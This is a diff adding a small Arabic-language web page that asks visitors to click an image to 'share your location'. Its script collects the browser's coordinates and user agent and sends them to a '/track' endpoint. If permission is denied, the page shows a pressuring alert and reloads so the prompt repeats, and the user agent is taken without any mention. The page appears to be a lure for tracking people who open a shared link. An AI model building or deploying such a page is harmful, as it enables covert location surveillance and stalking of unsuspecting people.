@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Click to Share Location</title>
+</head>
+<body>
+    <h2>اضغط على الصورة لمشاركة موقعك</h2>
+    <a href="#" onclick="sendLocation()">
+        <img src="https://www.newphotodownload.info/wp-content/uploads/2018/09/%D9%85%D8%AD%D8%A7%D8%AF%D8%AB%D8%A7%D8%AA-%D8%AD%D8%A8-%D8%A8%D9%8A%D9%86-%D8%AD%D8%A8%D9%8A%D8%A8%D9%8A%D9%86-12.jpg" width="200" height="200" alt="Click Me">
+    </a>
+
+    <script>
+        function sendLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(function(position) {
+                    let lat = position.coords.latitude;
+                    let lon = position.coords.longitude;
+                    let userAgent = navigator.userAgent;
+
+                    fetch(`/track?lat=${lat}&lon=${lon}&ua=${encodeURIComponent(userAgent)}`)
+                        .then(response => alert("✅ تم إرسال موقعك بنجاح!"))
+                        .catch(error => alert("❌ فشل في الإرسال!"));
+                }, function(error) {
+                    alert("⚠️ يجب السماح بمشاركة الموقع لإتمام العملية.");
+                    window.location.reload();
+                });
+            } else {
+                alert("❌ المتصفح لا يدعم تحديد الموقع.");
+            }
+        }
+    </script>
+</body>
+</html>
